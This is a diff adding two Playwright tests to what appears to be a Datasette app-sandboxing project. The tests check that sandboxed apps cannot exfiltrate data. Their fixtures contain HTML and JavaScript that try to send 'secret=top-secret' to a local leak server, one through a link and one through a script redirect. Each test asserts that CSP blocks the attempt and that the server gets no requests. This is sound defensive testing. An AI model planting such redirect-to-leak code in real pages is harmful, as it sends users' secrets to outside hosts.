@@ -514,6 +514,69 @@ console.error("Playwright saw this app error");
         )
 
 
+def test_external_link_click_renders_in_parent_error_panel(tmp_path):
+    with LeakServer() as leak_server:
+        server = DatasetteServer(tmp_path)
+        leak_url = leak_server.url + "/leak?secret=top-secret"
+        app = asyncio.run(
+            server.create_app(
+                f"""<!doctype html>
+<a id="external-link" href="{leak_url}">External link</a>""",
+                name="Blocked link",
+            )
+        )
+
+        with server, _browser_page() as page:
+            page.goto(server.app_url(app))
+            iframe = _iframe(page)
+            iframe.locator("#external-link").click()
+            page.locator(".datasette-app-error-panel:not([hidden])").wait_for()
+            page.locator(
+                ".datasette-app-error-kind", has_text="blocked-frame-navigation"
+            ).wait_for(state="attached")
+            assert (
+                page.locator(".datasette-app-error-message").text_content()
+                == f"Blocked frame navigation to {leak_url}"
+            )
+            details = page.locator(".datasette-app-error-details").text_content()
+            assert "Navigation source: link-click" in details
+            assert f"Blocked URI: {leak_url}" in details
+            assert leak_server.requests == []
+
+
+def test_csp_blocked_frame_navigation_renders_in_parent_error_panel(tmp_path):
+    with LeakServer() as leak_server:
+        server = DatasetteServer(tmp_path)
+        app = asyncio.run(
+            server.create_app(
+                f"""<!doctype html>
+<p id="status">loaded</p>
+<script>
+document.getElementById("status").textContent = "attempted";
+setTimeout(function() {{
+  window.location.href = {json.dumps(leak_server.url + "/leak?secret=top-secret")};
+}}, 100);
+</script>""",
+                name="Blocked navigation",
+            )
+        )
+
+        with server, _browser_page() as page:
+            page.goto(server.app_url(app))
+            page.locator(".datasette-app-error-panel:not([hidden])").wait_for()
+            page.locator(
+                ".datasette-app-error-kind", has_text="blocked-frame-navigation"
+            ).wait_for(state="attached")
+            assert (
+                page.locator(".datasette-app-error-message").text_content()
+                == f"Blocked frame navigation to {leak_server.url}"
+            )
+            details = page.locator(".datasette-app-error-details").text_content()
+            assert f"Blocked URI: {leak_server.url}" in details
+            assert "Effective directive: frame-src" in details
+            assert leak_server.requests == []
+
+
 def test_malicious_apps_cannot_exfiltrate_to_external_origin(tmp_path):
     content_db_path = tmp_path / "content.db"
     _create_secret_database(content_db_path)
